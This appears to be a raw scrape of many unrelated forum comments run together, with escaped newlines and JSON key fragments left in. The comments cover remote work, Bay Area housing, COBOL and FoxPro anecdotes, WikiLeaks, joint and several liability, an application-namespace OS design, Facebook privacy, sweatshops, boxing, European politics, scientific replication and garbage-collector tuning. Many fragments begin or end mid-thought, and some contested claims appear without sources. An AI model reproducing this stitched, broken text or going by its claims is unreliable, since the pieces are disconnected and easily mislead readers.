The company, which had been around for decades and was an engineering\nshop, predictably went bankrupt because they were not able to adapt to modern\nconditions. You have to be able to keep up if you are going to work in the\ntech industry. This applies to companies even more so than employees.\n\nCompanies that can't handle working remotely in 2011 are exactly the same.\nThey are dinosaurs and are becoming completely irrelevant.

Face to face interactions? What sort of argument is that anyway. We\nhave had that for a while now through videophones. Almost everything that can\nbe done in an office can be done in a home office.

And I asked the realtors if they\nexpected to get any offers. They already had offers but they are waiting until\nMonday to sit down and sift through them. And then the big question, could\nthey describe the type of people buying these houses?\n\nThe answer was couples where both parents worked in the tech industry with a\ncombined income of over $300,000. Usually one child and often one on the way,\nmany have houses already further away (Livermore, Gilroy, Morgan Hill) that\nthey are selling.\n\nNow that is unscientific, it is the experience of one broker who is sitting in\none open house, showing the house to prospective buyers and gently quizzing\nthem on their financials in order to understand if they are good prospects or\nnot. But I can see other evidence that its probably accurate, the folks moving\ninto my neighborhood fit that profile. A lot of people looking for \"good\nschools\" because if you don't pay private school tuition that saves you\n$15,000 per kid per year you can put into house payments.\n\nMy point being that the houses are being listed and sold in a short time\nframe. That suggests that the housing market is pricing appropriately for the\nbuyers. That there are more buyers than houses pushes up the price and pushes\nout the buyers who do not earn as much. However, unlike San Francisco, there\nis a _lot_ of residential building being put up on the peninsula and south\ntoward San Jose.

There were some EE times articles\nsuggesting multi-level memory (non-binary) as another application.\n\nThe weird thing is \"negative resistance\" isn't something that makes sense\nelectrically, and what they are really talking about is plotting the value of\ncurrent with respect to voltage, a resistor is a simple line, diodes are a\ndiscontinuous at their forward avalanche voltage, and these things have\n_lower_ current passing through them at some _higher_ voltage.

So if our beliefs change through relationship (and of course\ninformation too), we are likely to de-emphasize that.

It hadn't been covered in any of the other programming literature that I\nwas devouring at the time.\n\n\\- I wrote a variable interpolator in COBOL. COBOL has no string operators or\nanything resembling a string data type. This one was tricky. I was working as\na programmer\/operator at a school district at the time and the central hub of\ntheir IT was a Unisys mainframe that ran COBOL and WFL. There weren't any\npunch cards anymore, but everything ran as if there were; for any given job to\nrun, say, report cards, you had to go into the WFL job and edit a two-digit\nschool code in half a dozen places, in \"digital punch cards\", which would then\nbe fed one after the other into COBOL programs. This was error-prone and I\nwanted a way to define a couple of variables at the top of the job file and\nthen have everything work after that.\n\n\\- I worked for a BigCo that used Remedy for its internal support systems.\nThere were some latent training issues in the internal support department and\nsupport requests kept getting modified by unknown people, which would cause\nthe requests to get mishandled and would irritate various other departments. I\nfound a way to sneak some code into the Remedy forms system and I cobbled\ntogether a very rudimentary communications protocol between several forms so\nthat all changes to any form got logged to another form, along with the user's\nid. Remedy had no loop logic at the time. That actually made it to a Remedy\ndeveloper's group mailing list once and I was a big fish in a very tiny little\npuddle for a day.\n\n\\- I reverse-engineered portions of the .dbf format that FoxPro uses, and\nwrote software that could convert .dbf files into MySQL tables. The date\nformat was tricky. It was an 8 byte field where the first four bytes were a\nlittle-endian integer of the Julian date (so Oct. 15, 1582 = 2299161), and the\nnext four bytes were the little-endian milliseconds since midnight.

In a\ndifferent time such leaks would have come from a spirited and lively free\npress, but today our traditional forms of journalism (newpapers, radio, tv)\nare utterly mainstream, moribund, and very much part of the establishment.\nWikileaks throws the new order into sharp contrast and raises questions about\nwhat is journalism, what legal protections journalism deserves, etc. Some of\nthese questions _had_ been answered (especially in the US) but the question\nnow is to what degree and in what way do those decisions carry over to the\nbrave new world of the internet.\n\nThe worst case scenario is that courts, the public, etc. decide to keep an\nantiquated cargo cult definition of journalism, restricted to newspapermen and\ntelevision reporters. The danger there is that the flourishing of journalism\non the internet in unfamiliar forms will lack the protections (legal and\nsocietal) that traditional journalism has had.\n\nThis is all the more sensational because Assange and wikileaks have become the\nposter boy \/ touchstone for these issues. This is troubling to me because\nwikileaks is not the best archetype for nouveau journalism. Firstly he has a\nvery significant political ax to grind (though he has not been grinding it as\nsharply as in the past such as with \"Collateral Murder\"). Secondly the\nrevelations that have come from wikileaks have tended to be comparatively\nminor, especially when judged against the cost of obtaining the leaked\ninformation. This sets him up as the perfect target for governments and\ntraditionalists to tar and feather him and use him as an archetypal example of\nwhy new media is not journalism and does not deserve the same protections as\ntraditional journalism.\n\n","5194":"I haven't read the article yet.

Three men go out hunting. They come to a\nclearing, and two of the men go around on the left and the third goes around\non the right.\n\nA game bird flies up from the clearing when the two groups are on opposite\nsides. Both men on the left fire at the bird. One of them gets the bird. One\nof them misses the bird but hits their companion who was going around the\nright.\n\nIt is not possible to determine which man shot the bird and which shot the\nhuman. Both shooters claim that they definitely shot the bird, of course.\n\nThe third man sues the first two. There's no outcome that does not screw at\nleast one of the three:\n\n1\\. The court could find neither shooter is liable, since it cannot be proven\nwhich actually fired the errant shot. That screws the third man since he got\nshot and cannot collect damages from the shooter.\n\n2\\. The court could find that both shooters are liable, and make each pay half\nthe damages. Assuming each shooter can actually afford half the damages that\nis fair to the third man, but screws whichever shooter actually hit the bird.\n\n3\\. Furthermore, in #3, support it turns out one of the shooters has a lot\nmore money than the other. Then in addition to screwing one of the shooters,\nthe third man could get screwed in that he might not be able to collect enough\nto cover his medical bills.\n\n4\\. The court could find that the two shooters are jointly liable, and not\neven try to allocate blame between them. The third man can enforce the\njudgement against them however he wants. So, if one shooter has a lot of money\nand one does not, the third man would enforce against the one with the most\nmoney. This is good for the third man as it lets him get his medical bills\ncovered. It potentially screws the wealthy shooter, though, if in fact he was\nthe one who shot the bird--he's left holding the bag for all of the damages.\n\nThe way it actually happens in most states is #4. The idea is that of the\nthree men the one who least deserves getting screwed is the guy who got shot,\nso we want to maximize the chances that he can recover full damages, and can\ndo so quickly. Only #4 ensures that.\n\nAs far as the shooters go, if one of them isn't happy with the way the third\nman chooses to go about collating the damages, he's free to file a lawsuit\nagainst the other shooter to recover the amount he thinks he was unfairly\nforced to pay.\n\nNote that even though one of the shooters did not shoot the third man, it was\nhis shot that created the ambiguity as to which one of them did shoot the\nthird man.\n\nThis is called \"joint and several liability\".\n\nThis is a pretty good system. It lets the party that is actually injured get\ndamages quicker to get them on the road to recovery (and keep them from\ngetting bankrupted by medical bills), but still lets the parties that\ncontributed to the injury fight it out among themselves to figure out how,\nultimately, the damages should be split among them.\n\nNote: joint and several liability only applies to defendants who do have some\nliability, as determined by the court, I believe.\n\n","5293":"Here [1] is a newspaper story from the June 4th, 1937 Milwaukee Journal about\nthe test to demonstrate the strength of the columns to building regulators.\n\nHere's the explanation given for why the columns were stronger than the\nregulators expected:\n\n    \n    \n       Secret of weight carrying ability of the new pillar,\n       according to Wright, lies in its departure from the\n       conventional way of building concrete pillars.\n       Instead of using steel rods to reinforce the concrete,\n       the architect has perfected a steel mesh core.\n    \n       \u201cIron rods in concrete represent the bones of a human\n       foot.

My thought was to go a step\nfurther than what could be achieved by simply choosing a base set of packages\nfrom an existing distro:\n\nConsider what we currently consider the \"filesystem\" tree to instead be a\n\"namespace\" tree. \/dev (device namespace), \/proc (process namespace), and \/sys\n(kernel namespace) remain where they are and two new namespaces are\nintroduced: \/file (filesystem namespaces), and \/app (application namespace).\nUnder \/file, volumes are mounted to directories named after them, e.g.\n'\/file\/Primary', '\/file\/Vacation Photos', '\/file\/Windows', etc. The namespace\nhierarchy is a tmpfs, real disk space only exists under volumes mounted in\n\/file. \/app is any application's own AppDir.\n\nSee, each application has it's own namespace like Plan9. When an AppDir is\nlaunched, it immediately has its view of the filesystem unshared and a new\nnamespace hierarchy is built for it under \/app according to a combination of\nits own specifications and those imposed by the user. For instance, it may not\nrequire \/proc, \/dev, or \/sys, and the user may have restricted it to read-only\naccess to \/file, so the new hierarchy under \/app is setup accordingly.\n\/app\/app is bind-mounted to the AppDir itself, and then the actual application\nis launched with a chroot into \/app (the new namespace we set up for it). Now\nit can always refer to its own AppDir relative files using \/app\/*\n(conveniently the same number of characters as \/usr\/, for reasons I know\nyou've thought of). Obviously, other Linux namespaces (ipc, network, even user\nI suppose) can similarly be configured. The isolation portion of this plan is\nnot entirely unlike how firejail can be used with AppImage, but it's the way\nthe system works by default.\n\nThis allows a lot of flexibility for compatibility. An AppDir could specify\nthat it uses the (legacy) GNU library set, so it gets a \/lib in its namespace\nthat is a bind mount to the system provided GNU libraries\n(\/file\/Primary\/System\/Libraries\/GNU, for instance). In fact, you could run an\nentire linux distribution inside an AppDir this way, and you could setup its\nnet namespace such that it displays in an Xephyr or XWayland window (or some\nother X server on whatever display system ends up being used). And hey, why\nnot do the same thing for Windows with WINE? Now you have Windows and Linux\ncompatibility layers and they're isolated as much or little as you want.\n\nThe AppDirs could also contain multiple binaries. For instance, they could be\nlike \"fat\" binaries were for MacOS and NeXT where the application came with a\nbinary for each architecture and the appropriate one was launched. Or imagine\nan office suite, where double-clicking the AppDir might launch the \"pick the\ntool\" window, or you could right-click and get a context menu letting you\nchoose which tool you want to run. I was a fan of the old-school Windows Start\nMenu that was just a menuized view of a folder structure, so lets say that was\npart of your GUI, then AppDirs with the context menu show those menu items as\nsubitems of the AppDir.\n\nAnyways, that's a sample of the lines of thinking I have on the subject. Like\nyou said, it's a lot of resources for one person to muster. I've gone as far\nas writing the code to configure application namespaces and launch them, which\nwas shockingly easy, and I started to lay out how the init system would have\nto work (since it'd be responsible for automounting volumes in \/file, setting\nup networks, feeding firmware blobs to the kernel (ugh), and launching\napplications at a minimum). But I find it hard to feel motivated because\nwhenever I talk about these ideas I get into long arguments with people who\nthink things are better as they are.

Each \"bet\" they make, even if\nonly $25,000 is simply too high a portion of their total investment pool.\n\nAs for the requirements being arbitrary, that's a double edged sword.

It's perfectly legitimate to\nsay \"multiply together all the primes between 1 and p_n\" without knowing which\nnumbers in particular those happen to be. Since I don't know which numbers I\nmultiplied together, I won't know the numeric value of the number produced in\nstep 3, but I certainly _do_ know that by construction, it is not divisible by\nany prime <= p_n. (Technically, I know this conditional on the lemma \"all\nprime numbers are greater than one.)\n\nThe proof I've given doesn't deal with arbitrary sets of primes at all. There\nis no point in the proof at which you could multiply 3 and 5 and then add one\nto produce 16. If 5 is the largest prime, the number (implicitly) computed in\nstep 3 is 2\u22c53\u22c55 + 1 = 31. Iterating from 2 (but why?), you'd compute 3, then\n7, then 211, and then something large. And 2\u22c53\u22c55\u22c57\u22c511\u22c513 + 1 = 30031 = 59\u22c5509\nisn't a counterexample to the proof I've given, because the conclusion is\nexplicitly \"the number constructed must have a prime factor greater than p_n\",\nand p_n in this example is 13. 59 and 509 are both greater than 13.\n\nWhere does my proof fail? How is yours more correct? You still seem to think\nthat I'm misstating the proof found in the _Elements_.

Then those ASTs are\ncomplied to functions (ignoring our cross-function optimizations).\n\nThen it's just down to generating a complete DAG of dependencies, and using\nthat to sort the assignments (cells) topologically. The sheet can be evaluated\nnaiively at that point by injecting the references into each subsequent\nassignment\/cell and storing the result in a map (ranges injected as a seq over\na range).\n\nThere's a lot more to it, and it's getting better all the time, but that's the\ngist of it.

Besides, the other two have compiler support so have it\nmuch easier when they want to track roots. You can statically insert\nunconditional calls to `roots.push(var)` if you own the compiler, but as a\nlibrary author you can have to keep track of many things at runtime to\ndetermine if something is a root (which is why llvms solution looks promising\nto me).

I believe that the actual principle\nbehind how Facebook represents privacy is relevant to how they could have\nimplemented a solution (because it's not at the level you would expect it to\nbe, unlike the default privacy selector) but I get that this is not what you\ncare about.\n\nI sincerely believe that attracting readers\u2019 attention to the problem without\nletting the authors\u2019 correct it first would make the problem worst. I expect\ncurrent Facebook employees to think the same.\n\nAnother key aspect to answer your question: the list of people who saw a post\n(or paid significant attention to) is also probably not an information that\nFacebook can easily access: there are aggregates streamed for ads, but\ngathering that information for non-sponsored posts would be genuinely hard, if\nnot impossible in some aspects.\n\nEven though Facebook prides itself on allowing people to speak freely, and has\nencouraged more open communication by default in the past, there is a clear\nsense that letting posts have more visibility than they should can be\nindividually very damaging. That\u2019s why they restricted everything until\nauthors could review it. It\u2019s less \u201ca sensible plan\u201d than the only thing they\ncan do now.\n\nWhat I wonder (and the source is not clear) is whether Facebook didn\u2019t correct\nthe privacy settings of posts if the author edited them -- those were\npresumably not affected by the default setting. It\u2019s a minor point as few\npeople take care of that, but it could illustrate whether they were trying to\nfix it as fast as possible or had a more deliberate understanding of what can\nbe done.\n\nPosts are often viewed hours or days after they were posted. I can\u2019t remember\nratios, but it is far from negligible, especially if they are either public or\nhave some activity to them. Public posts on profile where most posts are only\nvisible to friends can be seen long after their were posted, by non-friends\nvisiting your profile.\n\nTo answer your question: I do not think that this edit is a sufficient course\nof action. It\u2019s very obvious to me that such an error revealed an issue in the\ncode release process: that should have been caught earlier and given proper\nreview. I suspect, from having seen another major bugs being addressed, that\nthe most senior engineers have actually already defined test to detect and\nprevent similar issues. Facebook does not communicate very transparently about\nits post-mortem, but they are probably the best in the business.\n\nThis aspect of the company (the lack of blame of the individual, often junior\ndevelopper who committed the code and the instant claim of responsibilities of\nsenior developers responsible for code quality checks) is actually one of the\nleast talked about but most important aspect of the company culture. You very\nrapidly get a sense of what \u201cMove fast, break things\u201c actually means: it\u2019s\nabout trying, tracking and never letting a failure unused as a learning\nopportunity \u2013\u2013 far more than it\u2019s about not respecting SLAs. The idea is that\nyou often learn about unexpected dimensions of issues by making mistakes, so\nyou might as well learn before someone else figures it out. It sounds counter-\nintuitive, but has proven to be an effective way to be several steps before\npeople who try to do harm.\n\nI personally detail that post-mortem every time that I\u2019m asked what the\ncompany is like: people expect perks & world-domination plot: the eagerness to\nfind a scalable technical and cultural solution is actually far more important\nand welcoming. I failed to see this was what you were curious about, and I\napologise for that.\n\nI suspect that the oversight is along the lines of: security and privacy are\nparamount and actually embedded one abstraction level below what most coders\nsee (hence: not ACL) but the default selector has been overlooked, because its\nrelated to post editing \u2014\u2014 under the idea that post authors are conscious of\npicking the right one every time: that\u2019s obviously unrealistic, and I suspect\nthat all the attention given to privacy now includes changes to the default\nprivacy selector. Given how those are different paradigm sounds to me like a\npotentially convoluted solution.\n\nLet me know if that is closer to what you were curious to know.\n\n","6303":"Not the OC, but I\u2019ve heard that comment line often:\n\n\\- what appears like sweatshops are actually significantly preferable working\nconditions for the local population; workshops are hot and crowded sure, but\nit\u2019s sheltered and beats back-breaking farming, where pests can eat your\nyearly revenue overnight; (that point you agree with, as far as I can tell)\n\n\\- so much that, in some conditions \u201csweatshops\u201d are a positive thing and\nlocal people are excited over it: they show up early, some singing, in their\nbest clothes; (I have no evidence of this handy right now, you might disagree\nbut if you read the first point, it shouldn\u2019t be a surprise); example of that\nis the young rural Chinese workers who were happy to be hosted on bunk beds at\nFoxconn and others because that meant they could save more money, talking\nabout it like Facebook grads talk about free food; that effect might not last,\ndoesn\u2019t appear to have for Foxconn (or Facebook);\n\n\\- in the early conditions, \u201csweatshops\u201d are great and external political\nforces trying to ban them, or more often regulate them out of profitability\ni.e. existence, comes off as horribly misguided attempts; an extreme version\nof \u201cbetter is the enemy of good\u201d difficult to parse for a population without\nmany options;\n\n\\- adding expensive controls works against workers\u2019 expressed interests that\ncould be either a. legitimate but conditional (they need the money and the\nlocal standards are low, working fast is a tiring but reasonable way to\nachieve their goal) or b. the capitalist version of Stockholm syndrome. In my\nexperience, it\u2019s nowhere easy to sort the two edge-cases apart. If that\u2019s the\ncase, a market-liberal option is to let bad employers loose their workers by\nmaking sure there\u2019s low employment overall, the places with real opportunities\ncan poach them away. Also essential: personal growth needs to happen; I wasn\u2019t\nsuper hopeful that \u201cthe market\u201d would deliver until Lambda school.\n\nThat line of reasoning has been the first criticism of trade and workers\u2019\nunions since the XIXth century and the vertiginous growth of the Industrial\nrevolution: they defend current tradesmen and employees against newcomers.

I\u2019m less familiar with Amazon and convinced by that one, but if you\ngo on money-making\/saving forums, you\u2019ll notice how so many contributors have\ntried and compared dozens of gig-platforms. The common thread? Everyone there\n_started_ by being excluded from the standard employment market by personal\ncircumstances, unintended consequences of regulation, prejudice or sometimes\njust being a terrible human begin. But that\u2019s the starting point.\n\nI really don\u2019t think that the gig economy is the solution: banning 29-hour\nlimits, having incentives to accommodate for handicap, family life, etc. for\nany business that can shift hours also need to be in place. Few people want a\nseries of gigs; for the few who do, what many of those companies have done\nisn\u2019t worse than the alternative. For the many who want a stable, predictable\njob, I don\u2019t think the solution is to regulate industries where tasks are,\nsay, very time-specific.\n\n _Disclaimer:_ I\u2019ve worked for Deliveroo (the non-US equivalent to Doordash)\nand dealt with those questions a lot.

That is, chronic physical addiction.\n\nThese people were acting in an unchanged manner -- a normal manner -- but\ntheir environment changed.\n\nShould we have berated the Native Americans for being so susceptible to\nalcohol? Use societal and moral pressure to tell them what lousy choices they\nhave made? Were the NA that lived before alcohol introduction \"better\" (well)\nthan those who lived after it who were addicted (sick)?\n\nBefore we knew about the dosing thing, were those people sick? Or now that we\nknow that a the amount of lifetime exposure that triggers alcoholism in NAs is\nmuch less than others, could we call any particular experience with alcohol a\nbad decision? If I need 4 beers to become an alcoholic, and you need 40\nthousand, yet neither of us know which number we have, is going out for a beer\nin college something society should tell us is bad?\n\nThese are complex issues for which simple words that have thousands of years\nof baggage behind them like \"disease\" aren't going to work. My opinion is that\nif the individual makes decisions that he\/she knows with greater than a 50%\ncertainty will cause eventual long-term bodily harm, then the consequences are\nnot a disease -- it's a personal choice. Even though it may have attributes of\na disease. But I don't think the rising number of obese people is due to a\nhuge number of people making informed choices with probable negative\nconsequence.

I don't think so, yet one of us now has a\nlifelong condition. So without any change in our behavior, environmental\nconditions contribute to changing the way our bodies and minds work. So yes,\nthese people are sick -- in some sense of the word. (forgive the over-broad\nuse of the carb model here.

It's one of the things that made Ali special, he\ncompletely dominated the game in his younger years with speed and nimbleness\nthat had scarcely been seen before in the heavyweight division. Then he went\nto jail because he famously refused to fight in Vietnam (\"No vietcong ever\ncalled me a ngr\"), which was quite brave as if he had served he'd be loved by\nthe vast majority in the US, continued to box, and never have to fight or risk\nhis life, as he would be doing boxing exhibitions for soldier morale,\ncampaigning etc. He refused purely out of (political) ideology.\n\nAnyway, all that aside, what I wanted to say is what made him special is that\nwhen he got out everyone considered him to be too slow. He changed, he wasn't\nfast any longer, and older. Yet he was able to still dominate the weight class\nwith a completely different style, at the expense of his body.\n\nIt's not often we see that. Most fighters who lose their speed never stand a\nchance to even lesser fighters. It's like Mayweather losing the shoulder roll\nand still dominating. And it surprised many at the time, it's hard to imagine\nbut Ali, unlike the champions we think of today (like tonights fight) went\ninto many of his later fights as an underdog, the fight against Foreman being\nthe most famous. Foreman was considered an absolute beast, knocking out within\n2 rounds (brutally) people like Norton and Frazier, amazing fighters who Ali\nhimself had already lost to. Add to that an Ali way past his prime who had\nlost his greatest asset: his speed. That was remarkable.\n\nThe Ali in your video against Williams was as great as the Ali against\nForeman, but completely and totally different in style, strategy and capacity.\nIt's one of those things that don't show up on the scorecards (of say a\nMayweather, who never lost and has been a world champ for like 17 years in a\nrow now, compared to Ali who retired with 5 losses), reasons for which most\nboxing experts don't even have Mayweather in their top 20, no joke, while ali\nregularly makes a top 5, even though Mayweather is an absolutely brilliant\nfighter, too.\n\nThanks for the vid, good memories :)\n\n","6558":"Haha it's fooling virtually everyone in this thread\n\n","6559":"You're right, the charts don't show that. But the charts don't tell the actual\nstory.\n\nWhich is that all centrist parties have shifted right in their policy\npositions and rhetoric.\n\nThe charts only show power shifts between parties, but ignore shifts within\nparties. There's a lot of centrist parties that were rooted in Christian\nvalues for example, that were reasonable on e.g. refugee issues in the 20th\ncentury (which were much more significant than today, by the way), that now\nwant to amend laws, retract long-standing treaties, create walls and border\nfences, disallow schooling\/work\/status for those refugees who do get welcomed\nso as to send them right back asap in god knows when Syria recovers from being\na failed state, paired with hints of xenophobic rhetoric akin to a far right\nparty. Yet they're still deemed centrist parties, and would not show it on the\nchart.\n\nAnd that is precisely because the far right is on the rise, and the rest of\nthe political spectrum is adjusting and compromising their stance, so as not\nto lose votes. That's a very clear shift to the right.\n\nLike take the Netherlands, it shows a drop in the right-wing PVV's size since\n2010 (forget for a moment that the party's currently leading in the polls).\nYou'd think, alright no shift to the far right here at all. What it doesn't\ntell you is that the current biggest party (a non far right wing, right wing\nparty) has shifted much more to the right. Like recently we saw it's 2nd in\ncommand claim refugees were visiting the Netherlands to get plastic surgery,\nbreasts corrections, face lifts etc... I mean this guy is just a ridiculous\ndemagogue, instilling fear into the Dutch population that Syrian refugees\naren't actually running away from a gruesome war, but are merely looking to\nexploit our medical system to get plastic surgery, it's insane.

And this is the biggest party's 2nd\nin line, straight out the playbook of a far right-wing demagogue.\n\nNow this party isn't far-right for all intents and purposes, but it has very\nmuch shifted towards it on various policy positions and rhetoric, as have many\ncentrist and right wing parties.

For example, if the discussion centers around the problem of\nlibrary fines, suggesting to overhaul the entire socio-economic system to\nsolve it is not rational. In the same vein, the problem of homelessness in\ncertain urban areas does not lend itself to a solution based on destroying the\nentire system. I understand you're very excited about Marx and every issue is\njust another entry to an ideological debate of communism vs capitalism that\nyou want to have, but it tends to not be very productive and most will just\nignore it.\n\nI know you feel slighted that I haven't answered your objections, but honest\nto God, I have no idea what specifics to answer to. You view our modern\nsociety through a specific ideological lens and you can't just expect others\nto take on your ideological assumptions. Here's an example of something you\nargued: _\" Your position is that the unavailability of housing to those\nsuffering diseases tied directly to their being unable to pay market price for\nhousing somehow has nothing to do with the prevailing economic arrangement\nthat utterly defines the housing market these persons cannot participate in.\"_\n\nTo that, I can only say the following:\n\n1) You're putting words in my mouth, that isn't my position.\n\n2) That isn't the system we live in. We don't live in a purely capitalist\nsystem where everything is determined by the cold hand of the market. We live\nin a market-based economy, with a social welfare state. We spend inordinate\namount of money on providing a safety net, from government programs to grants\nand subsidies. Government social spending is also complemented by non-profits,\nprivate charities, and churches. So no, not having an income to pay rent does\nnot imply you're going to be homeless.\n\n3) Lack of income isn't what is driving homelessness. Chronic homelessness is\ndriven by drug and alcohol abuse, and mental illness. That is a fundamentally\ndifferent problem, requiring a fundamentally different approach for a\nsolution. Communist regimes (and I grew up in the Soviet Block)side-stepped\nthis issue because they would simply forcibly institutionalize a mentally ill\nperson found living on the street. I actually think that this is the correct\nsolution in this case as well.\n\nSo you tell me, given all that, how do I argue with you?

Germany installed 11 GW\nin new coal power plants from 2011 to date. When you crunch the numbers, that\ngives you a production of ~80 TWh per year from the new coal plants.\n\nNow, as the article you linked points out, this has replaced old coal plants\nbeing phased out.

The more cells with mutations, the greater the\nchance that you'll get cancer. So your cancer risk is proportional to the\nnumber of cells in your body (more candidates for mutation), to the age of\nthose cells (more opportunities for mutagenic factors to strike the right\ngenes in one cell or another -- this is why cancer incidence increases with\nage), and to the number of mutation-causing factors in your life. (Do not\nsmoke. Seriously, quit smoking right now.)\n\nMice are very tiny creatures relative to humans, and they live a very short\ntime (a three year old mouse is an old mouse). If mice had the same anti-\ncancer mechanisms as humans, a mouse with cancer would be vanishingly rare. As\nit is, it's still pretty hard to find a mouse with cancer, but it does happen\n-- but only because mice, who have no need for an infrastructure that will\nprotect their cells for 70-plus years, haven't bothered to evolve the same\nanti-cancer mechanisms that humans have.\n\nThe upshot is that \"cancer in mice\" is a very different disease from \"cancer\nin humans\", so while curing cancer in mice is _suggestive_ it is never\nconclusive.\n\nOne way to change the nature of this problem is to transplant human cancer\ncells into mice. Unfortunately, this technique only solves half the problem --\nthe cancer cells only make up a portion of a tumor, and their environment is\nvery important. Worse, the mice have to be immunodeficient to make a human-\ncancer transplant take. That makes studies like the one cited here -- which\ninvolve the cancer-fighting activity of a mouse's own immune cells --\ndifficult to do with human xenografts. (I actually think that such a study is\n_impossible_ , but I'm not a biologist so maybe there's a loophole I can't\nsee.)\n\n","6905":" _In addition ASP.NET's naming container ID mangling which causes client IDs\nto be changed can be very counter productive for styling with CSS and for\nworking with elements using JavaScript.

In 3 clinical experiments that I've\nfollowed closely, it was officially \"double blinded\" (and at least one was\npublished as such), but because the placebo was sugar, and the substance or\ntreatment under test was not inert (one caused dry mouth, one caused flushing,\nand in one laser treatment, people found the real thing painful, unlike the\nplacebo light).

Science's \"golden standard\" is essentially\nunattainable: 88% of the most (assumed) useful results about cancer in the\nlast 10 years cannot be replicated (therefore, scientifically _wrong_ , or in\nyour own words, shitty results accepted as valid). Read that again. And again,\nand let that sink. That's not an accident and that's not just because science\nis hard. That's a direct result of the way science is practiced these days\n(The xkcd is the super-short summary of one of the reasons, the Ioanaddis\npiece is the \"scientific\" version with many identified reasons).\n\nGuess what - if you do not change how science is practiced, you're guaranteed\nto get more shitty results. In fact, you're guaranteed to get a higher\npercentage of them with time (I don't remember if this piece by Ioanaddis\ntouches that, but he did in other places). People in science I've talked to\nexpected a 50% \"wrong result\" ratio from the golden standard that's supposed\nto give you good faith. No one expected the 88% failure result, but no one\nthinks it is exaggerated.\n\nAgain, these conclusions (results done the same double blind, N>>1) are going\nto get shittier and shittier, unless you change something about how you do\nstuff.\n\n> The way you pointed out that unreplicated papers are probably wrong seemed\n> like you thought you had some kind of gotcha.\n\nQuestion, if Seth did acceptable double-blind N=30 (assume sufficient)\nexperiments, would have pointed out that \"well, that's not scientific because\nit wasn't replicated?\", if so - kudos. But you'd be hard pressed to accept any\nnutrition or medical result published in the last 30 years, because the vast\nmajority does not comply with that standard. Do you have that response to any\nscientific news you hear?\n\nIf indeed you hadn't replied like that, then you are moving the goalposts. But\nI'll give you the extremely unlikely benefit that you would have.\n\n> Well the \"golden rules of science\" are pretty clear on the value to be\n> placed on unreplicated papers in a field overrun by media attention.\n\nThat is wishful thinking. For a few years, I read the medical literature and\nfollowed how things became standard practice (my SO at the time was a doctor,\nI'm an engineer). Results such as described by Ioannadis and the Amgen guy\nbecome accepted in medicine and nutrition without any attempt at replication.\nAnd then pulled back 10-20 years later when people are dying of e.g. Vioxx, or\nstatins (the sh*t has to hit the fan on this one; wait another 10 years), or\nrealize that most of the Prozac data was cooked to look much more significant\nthan it was.\n\n> Which side are you arguing?\n\nI'm arguing medical\/nutritional science as practiced today (especially its\nrelationship with \"publish or perish\" academia and \"a bad result will cost us\nupward of $400M\" pharma) has painted itself into a corner. The incentive\nstructure essentially guarantees that the percentage of wrong answers is going\nup. Replication is part of the \"gold standard\", but is rarely ever practiced.\n(The Amgen paper is the only modern systematic attempt at replication that I'm\naware of; and of the few casual replication attempts that fail, most don't get\npublished).\n\nIt's converging into an insane \"what must do this, even though we don't have\nthe facilities, but anything else is rotten, so we'll pretend it's ok and not\nbother replicate unless someone points out we're wrong\".\n\nWhat I'm arguing is not \"science is hard\" (it is!) or \"science is easy\" (it\nisn't). It is \"we need to find a new way to do science\". The golden \"double\nblinded, n->inf, multiple replication\" is the easiest to be convinced of, if\ndone right, but definitely not the only way to do science, and definitely not\noften done right (and with the existing incentive structure, will be done less\nand less so).\n\nI am arguing that we should find other ways to make progress, and I think\nRoberts is on the right track. Following him for the last 7 years, I know that\nhe produced more useful results (safe, easily testable, showing improvement\nfor a large percentage of people who attempt to follow) than most hundreds-of-\nmillion-dollars scientifically-golden experiments. And he did it in his free\ntime, and with no funding.\n\nThe way science is done needs a disruption. Double blind n->inf multiple\nindependent confirmation is indeed the easiest way to be convinced of a\nresult, but it is NOT the only way, and it is becoming increasingly\nrare\/impossible to carry out.\n\nWhat I'm arguing is that the gold standard is actually not achieved; You don't\ndisagree, I think. What we disagree about is how meaningful the results that\nare coming out are compared to the effort\/cost. I believe that the existing\ntradeoff is not acceptable; you seem to believe there is no tradeoff as there\nis only one way to do science (it's just that the ideal is not achieved).\n\nWhat I'm arguing is that Roberts is giving an example about how the way\nscience is done could be disrupted. It's immature, it's not easy to replicate\n(I'm not as placebo-resistant as Seth is, for example). But it has applicable\nresults, and is cheap and effective.\n\n","6926":"Reminds me of AlephVC[0] who did something quite similar.

And the whitest of them all are the BSD-like licenses, which\nare frowned upon by the FSF.\n\nAnd the reason I think proprietary software is like marijuana is because you\nCAN be careful when using it, you can also take it in small dosages where it\nmakes sense, you're only required to use it responsibly to not end up hooked\nwith freedoms lost.\n\nAnd of course, for some people marijuana usage turns into heroin -- but\neverybody fears heroin and heroin comes with a heafty price for the junkies,\nwhich isn't that good in the eyes of consumers (best things in life tend to be\ncheap ;))\n\nAlso, leaving this analogy behind -- let's take as example GIMP.\n\nGimp is awesome for what it does and I actually think its grotesque interface\nis the reason why I ended up working with masks, really groking effects like\nsmart-sharpening.\n\nBut if you're deep into photography, using Gimp is unacceptable. First, it has\nserious limitations like 8-bits per color (which means you're losing color\ninfo, when importing from RAW formats, or when composing layers -- and as a\npractical consequence, correcting over\/under-exposed photos becomes a\nnightmare). CMYK support is hackish at best, and photographers (professional\nor passionate amateurs) do print their photos (whether it's for selling, or\nfor doing exhibits). Then, while the UI forces you to learn about the inner-\nworkings of digital image processing, it becomes a pain in the ass to quickly\nretouch hundreds of photos (unless you can do them as a batch, with some\nscripting, but since every photo is unique, no, you can't).\n\nSo comparing a product like Adobe Photoshop, which provides real\/measurable\nvalue to photographers, with a drug that you can get rid of -- that's\nstretching it a lot.

All the bidding exchanges want the\nresponse to be generated in under 100ms, which includes the network roundtrip.\nThis means on the server-side, the average must not be higher than 10ms per\nrequest, preferably lower.

It's also non-compacting, but\nthat's a given, as it's not even fully precise yet.\n\nWhich is the reason for why integrations with bidding exchanges are usually\nwritten in C++ too (in case it's not clear, we are talking about B2B web\nservices). We've gone with the JVM because it provides a good\nproductivity\/performance balance, but eternal vigilance is needed in profiling\nthe memory allocation patterns and tuning the garbage collector to handle the\nload.

